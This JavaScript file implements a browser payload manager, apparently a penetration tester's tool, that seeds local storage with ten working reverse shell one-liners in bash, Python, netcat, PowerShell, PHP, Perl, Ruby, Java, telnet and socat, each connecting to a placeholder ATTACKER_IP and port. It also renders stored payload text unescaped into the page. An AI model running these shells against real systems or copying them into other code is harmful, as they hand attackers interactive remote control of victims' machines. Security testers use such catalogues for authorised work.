// Update timestamp
function updateTimestamp() {
  const now = new Date();
  const timestamp = now.toLocaleTimeString('en-US', { 
    hour12: false,
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
  document.getElementById('timestamp').textContent = timestamp;
}

// Update timestamp every second
setInterval(updateTimestamp, 1000);
updateTimestamp();

// Category display names
const categoryNames = {
  'sql': 'SQL Injection',
  'xss': 'XSS',
  'rce': 'RCE',
  'reverse-shell': 'Reverse Shell',
  'lfi': 'LFI/RFI',
  'ssrf': 'SSRF',
  'xxe': 'XXE',
  'deserialization': 'Deserialization',
  'authentication': 'Authentication',
  'authorization': 'Authorization',
  'command': 'Command Injection',
  'other': 'Other'
};

// Default reverse shell payloads
const defaultReverseShells = [
  {
    name: "Bash Reverse Shell",
    content: "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1",
    category: "reverse-shell",
    tags: ["bash", "tcp", "linux"],
    date: new Date().toISOString()
  },
  {
    name: "Python Reverse Shell",
    content: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
    category: "reverse-shell",
    tags: ["python", "socket", "linux"],
    date: new Date().toISOString()
  },
  {
    name: "Netcat Reverse Shell",
    content: "nc -e /bin/sh ATTACKER_IP PORT",
    category: "reverse-shell",
    tags: ["netcat", "nc", "linux"],
    date: new Date().toISOString()
  },
  {
    name: "PowerShell Reverse Shell",
    content: "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
    category: "reverse-shell",
    tags: ["powershell", "windows", "tcp"],
    date: new Date().toISOString()
  },
  {
    name: "PHP Reverse Shell",
    content: "<?php $sock=fsockopen(\"ATTACKER_IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");?>",
    category: "reverse-shell",
    tags: ["php", "fsockopen", "web"],
    date: new Date().toISOString()
  },
  {
    name: "Perl Reverse Shell",
    content: "perl -e 'use Socket;$i=\"ATTACKER_IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    category: "reverse-shell",
    tags: ["perl", "socket", "linux"],
    date: new Date().toISOString()
  },
  {
    name: "Ruby Reverse Shell",
    content: "ruby -rsocket -e'f=TCPSocket.open(\"ATTACKER_IP\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    category: "reverse-shell",
    tags: ["ruby", "tcp", "linux"],
    date: new Date().toISOString()
  },
  {
    name: "Java Reverse Shell",
    content: "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor();",
    category: "reverse-shell",
    tags: ["java", "runtime", "linux"],
    date: new Date().toISOString()
  },
  {
    name: "Telnet Reverse Shell",
    content: "telnet ATTACKER_IP PORT | /bin/bash | telnet ATTACKER_IP 4445",
    category: "reverse-shell",
    tags: ["telnet", "bash", "linux"],
    date: new Date().toISOString()
  },
  {
    name: "Socat Reverse Shell",
    content: "socat tcp-connect:ATTACKER_IP:PORT exec:\"bash -li\",pty,stderr,setsid,sigint,sane",
    category: "reverse-shell",
    tags: ["socat", "tcp", "linux"],
    date: new Date().toISOString()
  }
];

// Initialize with default reverse shells if no payloads exist
function initializeDefaultPayloads() {
  const payloads = JSON.parse(localStorage.getItem("payloads") || "[]");
  if (payloads.length === 0) {
    localStorage.setItem("payloads", JSON.stringify(defaultReverseShells));
    console.log("Initialized with default reverse shell payloads");
  }
}

// Get filtered and sorted payloads
function getFilteredPayloads() {
  const payloads = JSON.parse(localStorage.getItem("payloads") || "[]");
  const searchTerm = document.getElementById("search-input").value.toLowerCase();
  const categoryFilter = document.getElementById("category-filter").value;
  const sortBy = document.getElementById("sort-by").value;

  // Filter by search term
  let filtered = payloads.filter(payload => {
    const matchesSearch = !searchTerm || 
      payload.name.toLowerCase().includes(searchTerm) ||
      payload.content.toLowerCase().includes(searchTerm) ||
      (payload.tags && payload.tags.some(tag => tag.toLowerCase().includes(searchTerm)));
    
    const matchesCategory = !categoryFilter || payload.category === categoryFilter;
    
    return matchesSearch && matchesCategory;
  });

  // Sort payloads
  filtered.sort((a, b) => {
    switch(sortBy) {
      case 'name':
        return a.name.localeCompare(b.name);
      case 'category':
        return (a.category || '').localeCompare(b.category || '');
      case 'date':
        return new Date(b.date || 0) - new Date(a.date || 0);
      default:
        return 0;
    }
  });

  return filtered;
}

function loadPayloads() {
  const payloads = getFilteredPayloads();
  const container = document.getElementById("payloads");
  container.innerHTML = "";

  if (payloads.length === 0) {
    container.innerHTML = `
      <div style="text-align: center; padding: 20px; opacity: 0.7; font-style: italic;">
        No payloads found.<br>
        <span style="font-size: 12px; color: #00ffff;">Try adjusting your search or filters.</span>
      </div>
    `;
    return;
  }

  payloads.forEach((payload, index) => {
    const div = document.createElement("div");
    div.className = "payload";

    // Format tags
    const tagsHtml = payload.tags && payload.tags.length > 0 
      ? `<div class="payload-tags">${payload.tags.map(tag => `<span class="tag">${tag.trim()}</span>`).join('')}</div>`
      : '';

    // Format date
    const dateStr = payload.date ? new Date(payload.date).toLocaleDateString() : 'Unknown date';

    div.innerHTML = `
      <div class="payload-header">
        <div class="payload-name">${payload.name}</div>
        ${payload.category ? `<div class="payload-category category-${payload.category}">${categoryNames[payload.category] || payload.category}</div>` : ''}
      </div>
      <div class="payload-meta">Added: ${dateStr}</div>
      ${tagsHtml}
      <textarea readonly style="width:100%;height:60px;">${payload.content}</textarea>
      <div class="buttons">
        <button class="copy">[ COPY ]</button>
        <button class="delete">[ DELETE ]</button>
      </div>
    `;

    div.querySelector(".copy").addEventListener("click", () => {
      navigator.clipboard.writeText(payload.content).then(() => {
        // Show success feedback
        const btn = div.querySelector(".copy");
        const originalText = btn.textContent;
        btn.textContent = "[ COPIED! ]";
        btn.style.background = "linear-gradient(45deg, #00ff41, #00cc33)";
        btn.style.color = "#000";
        
        setTimeout(() => {
          btn.textContent = originalText;
          btn.style.background = "linear-gradient(45deg, #0066ff, #0099ff)";
          btn.style.color = "white";
        }, 1500);
      }).catch(err => {
        console.error('Failed to copy: ', err);
      });
    });

    div.querySelector(".delete").addEventListener("click", () => {
      if (confirm(`Delete payload "${payload.name}"?`)) {
        const allPayloads = JSON.parse(localStorage.getItem("payloads") || "[]");
        const payloadIndex = allPayloads.findIndex(p => 
          p.name === payload.name && p.content === payload.content
        );
        if (payloadIndex !== -1) {
          allPayloads.splice(payloadIndex, 1);
          localStorage.setItem("payloads", JSON.stringify(allPayloads));
          loadPayloads();
        }
      }
    });

    container.appendChild(div);
  });
}

// Add event listeners for search and filters
document.getElementById("search-input").addEventListener("input", loadPayloads);
document.getElementById("category-filter").addEventListener("change", loadPayloads);
document.getElementById("sort-by").addEventListener("change", loadPayloads);

document.getElementById("add-btn").addEventListener("click", () => {
  const name = document.getElementById("payload-name").value.trim();
  const content = document.getElementById("payload-content").value.trim();
  const category = document.getElementById("payload-category").value;
  const tagsInput = document.getElementById("payload-tags").value.trim();

  if (!name || !content) {
    // Show error message
    const errorDiv = document.createElement("div");
    errorDiv.className = "error";
    errorDiv.textContent = "Name and payload content are required!";
    errorDiv.style.marginTop = "10px";
    
    const addSection = document.getElementById("add-section");
    const existingError = addSection.querySelector(".error");
    if (existingError) existingError.remove();
    
    addSection.appendChild(errorDiv);
    
    setTimeout(() => {
      errorDiv.remove();
    }, 3000);
    return;
  }

  // Process tags
  const tags = tagsInput 
    ? tagsInput.split(',').map(tag => tag.trim()).filter(tag => tag.length > 0)
    : [];

  const payloads = JSON.parse(localStorage.getItem("payloads") || "[]");
  payloads.push({ 
    name, 
    content, 
    category, 
    tags,
    date: new Date().toISOString()
  });
  localStorage.setItem("payloads", JSON.stringify(payloads));

  // Clear form
  document.getElementById("payload-name").value = "";
  document.getElementById("payload-content").value = "";
  document.getElementById("payload-category").value = "";
  document.getElementById("payload-tags").value = "";

  // Show success message
  const successDiv = document.createElement("div");
  successDiv.className = "success";
  successDiv.textContent = `Payload "${name}" added successfully!`;
  successDiv.style.marginTop = "10px";
  
  const addSection = document.getElementById("add-section");
  const existingSuccess = addSection.querySelector(".success");
  if (existingSuccess) existingSuccess.remove();
  
  addSection.appendChild(successDiv);
  
  setTimeout(() => {
    successDiv.remove();
  }, 3000);

  loadPayloads();
});

// Add keyboard shortcuts
document.addEventListener('keydown', (e) => {
  // Ctrl+Enter to add payload
  if (e.ctrlKey && e.key === 'Enter') {
    document.getElementById("add-btn").click();
  }
  
  // Escape to clear form
  if (e.key === 'Escape') {
    document.getElementById("payload-name").value = "";
    document.getElementById("payload-content").value = "";
    document.getElementById("payload-category").value = "";
    document.getElementById("payload-tags").value = "";
  }
});

// Initialize
initializeDefaultPayloads();
loadPayloads();
